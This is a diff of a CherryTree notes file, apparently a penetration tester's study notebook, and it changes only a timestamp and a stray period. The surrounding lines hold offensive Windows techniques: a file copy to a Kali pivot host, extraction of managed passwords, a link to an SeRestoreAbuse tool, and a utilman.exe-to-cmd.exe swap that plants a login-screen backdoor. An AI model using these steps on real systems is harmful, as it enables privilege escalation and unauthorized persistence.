@@ -971,7 +971,7 @@ echo "password" | .\scp.exe -P 6000 file kali@{pivot IP}:file # the actual trans
         <rich_text>)
 - Check for password reusal</rich_text>
       </node>
-      <node name="Interesting Cases" unique_id="120" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1693140125" ts_lastsave="1693142416">
+      <node name="Interesting Cases" unique_id="120" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1693140125" ts_lastsave="1693142435">
         <rich_text>If we find that we have </rich_text>
         <rich_text weight="heavy">PrincipalsAllowedToRetrieveManagedPassword</rich_text>
         <rich_text> (we have an allowed group) permissions to extract passwords, use: </rich_text>
@@ -998,7 +998,6 @@ If we have </rich_text>
 
 Or try this: </rich_text>
         <rich_text link="webs https://github.com/dxnboy/redteam/blob/master/SeRestoreAbuse.exe">https://github.com/dxnboy/redteam/blob/master/SeRestoreAbuse.exe</rich_text>
-        <rich_text>.</rich_text>
         <codebox char_offset="366" justification="left" frame_width="500" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">move C:\Windows\System32\utilman.exe C:\Windows\System32\utilman.old
 move C:\Windows\System32\cmd.exe C:\Windows\System32\utilman.exe</codebox>
       </node>
